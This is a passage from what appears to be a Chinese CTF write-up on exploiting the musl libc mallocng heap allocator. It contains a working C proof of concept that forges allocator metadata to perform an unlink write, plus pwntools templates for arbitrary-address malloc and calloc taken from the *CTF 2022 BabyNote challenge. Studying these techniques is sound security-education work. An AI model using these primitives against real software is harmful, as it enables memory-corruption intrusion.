<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后在 <code>free</code> 中的循环满足条件跳出循环调用 <code>nontrivial_free</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br></pre></td></tr></table></figure></div>

<p>进入 <code>nontrivial_free</code> 函数后会执行如下代码。<code>okay_to_free</code> 函数返回非 0 的前提是 <strong><code>meta-&gt;freeable</code> 非 0</strong>，另外还要确保 <strong><code>meta-&gt;sizeclass</code> &lt; 48</strong> 。之后调用 <code>dequeue</code> 函数触发 unlink 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>之后进入 <code>free_group</code> 函数后为了减小伪造难度不再调用 <code>nontrivial_free</code> 要保证 <code>maplen</code> 不为零。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_unlink" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_SIZE 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_INDEX 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_INDEX 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">        <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">        <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">        <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">        <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">        <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">        <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">        <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - __builtin_ctz(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable: <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass: <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen: <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> *<span class="title">ctx</span> =</span> (<span class="keyword">struct</span> malloc_context *) (&amp;<span class="built_in">printf</span> + <span class="number">0x247193</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">target</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = ctx-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = size_to_class(FAKE_CHUNK_SIZE - IB);</span><br><span class="line">    fake_meta-&gt;last_idx = LAST_INDEX;</span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;</span><br><span class="line">    fake_group-&gt;meta = fake_meta;</span><br><span class="line">    fake_meta-&gt;avail_mask = ((<span class="number">2U</span> &lt;&lt; LAST_INDEX) - <span class="number">1</span>) ^ (<span class="number">1</span> &lt;&lt; FAKE_CHUNK_INDEX);</span><br><span class="line">    fake_meta-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *fake_chunk = (<span class="type">uint8_t</span> *) ((<span class="type">uint64_t</span>) fake_group-&gt;storage + size_classes[fake_meta-&gt;sizeclass] * UNIT * FAKE_CHUNK_INDEX);</span><br><span class="line">    *(<span class="type">uint16_t</span> *) (fake_chunk - <span class="number">2</span>) = (fake_chunk - fake_group-&gt;storage) / UNIT;</span><br><span class="line">    fake_chunk[<span class="number">-3</span>] = FAKE_CHUNK_INDEX;</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = fake_meta-&gt;next = &amp;target;</span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line">    assert(target.prev == target.next &amp;&amp; target.prev == &amp;target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="任意地址-malloc（calloc）"><a href="#任意地址-malloc（calloc）" class="headerlink" title="任意地址 malloc（calloc）"></a>任意地址 malloc（calloc）</h3><p>以 <a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/starctf2022_BabyNote" >2022*CTF BabyNote<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为例。<br>伪造 <code>group</code> ，<code>meta</code>，<code>meta_area</code>，然后释放 <code>group</code> 中的 <code>chunk</code> 使 <code>meta</code> 链入 <code>active</code> 链表中。之后反复释放和申请 <code>meta</code> 所在 <code>chunk</code> 并修改 <code>meta</code> 中的 <code>mem</code> 指向就可以达到任意地址 <code>malloc</code> 的效果。<br>注意 <code>enframe</code> 函数中有如下检查，因此需要申请的 <code>fake chunk</code> 的前面对应位置应该为 0 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(!p[<span class="number">-4</span>]);</span><br></pre></td></tr></table></figure></div>

<p>模板如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">fake_name_addr = libc.address + <span class="number">0xb7990</span></span><br><span class="line">fake_meta_area_addr = libc.address - <span class="number">0x6000</span></span><br><span class="line">fake_meta_addr = fake_meta_area_addr + <span class="number">0x8</span></span><br><span class="line">fake_group_addr = elf.address + <span class="number">0x4b90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr).ljust(<span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = (<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0xfe0</span> + p64(leak_secret) + fake_meta).ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(fake_name_addr)  <span class="comment"># name_addr</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># content_addr</span></span><br><span class="line">fake_node += p64(<span class="built_in">len</span>(<span class="string">&#x27;fake name&#x27;</span>))  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># content_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br></pre></td></tr></table></figure></div>

<p>对于 calloc 函数，定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> m, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &amp;&amp; m &gt; (<span class="type">size_t</span>) <span class="number">-1</span> / n) &#123;</span><br><span class="line">        errno = ENOMEM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    n *= m;</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">malloc</span>(n);</span><br><span class="line">    <span class="keyword">if</span> (!p || (!__malloc_replaced &amp;&amp; __malloc_allzerop(p)))</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    n = mal0_clear(p, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span>(p, <span class="number">0</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> is_allzero __malloc_allzerop</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_allzero</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">    <span class="keyword">return</span> g-&gt;sizeclass &gt;= <span class="number">48</span> ||</span><br><span class="line">           get_stride(g) &lt; UNIT * size_classes[g-&gt;sizeclass];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在调用完 <code>malloc</code> 之后如果 <code>__malloc_replaced</code> 为 0 则会调用 <code>__malloc_allzerop</code> 函数，该函数会调用 <code>get_meta</code> ，在 <code>get_meta</code> 函数中有大量检查，因此如果要用 <code>calloc</code> 实现任意地址 <code>malloc</code> 需要先将 <code>__malloc_replaced</code> 改为非 0 。</p>
<p>在 <code>enframe</code> 函数中会设置申请的 <code>chunk</code> 的头部信息。因此只要通过伪造 <code>meta</code> 使得对应字段不为 0 且该字段会覆写 <code>__malloc_replaced</code> 从而在第一次任意地址 <code>malloc</code> 修改 <code>__malloc_replaced</code> 为非 0 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) = (<span class="type">size_t</span>) (p - g-&gt;mem-&gt;storage) / UNIT;</span><br><span class="line">p[<span class="number">-3</span>] = idx;</span><br></pre></td></tr></table></figure></div>

<p>模板如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">malloc_replaced_addr = libc.address + <span class="number">0xb6f84</span></span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_meta_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(malloc_replaced_addr - <span class="number">0x80</span> - <span class="number">0x20</span> + <span class="number">4</span>)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b10</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = (<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0xfd0</span> + p64(leak_secret) + fake_meta).ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h3><p>这里以 <a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/starctf2022_BabyNote" >*CTF 2022 BabyNote<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为例 感受一下。</p>
<p>图中绿色表示 <code>Available</code> ，红色表示 <code>Freed</code> ，白色表示 <code>Inuse</code> 。</p>
<p>这里假设 <code>A</code> 为 <code>node</code> ，<code>B</code> 为 <code>name</code> ，<code>C</code> 为 <code>content</code> ，考虑 0x30 的 <code>active</code> 。</p>
<p>首先构造如下堆排布：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/455bc0063b0d2e9ac657215d1e12c878.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<p>释放第一个 <code>node</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3cd624e124e8074f35fcccb9c40b2b76.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>再次创建一个 <code>node</code>，由于优先分配 <code>Available</code> 状态的 <code>chunk</code> 因此 <code>A</code> 和 <code>C</code> 顺序与正常情况相反。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/281bc1efb8c0cdc957333889341d594f.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
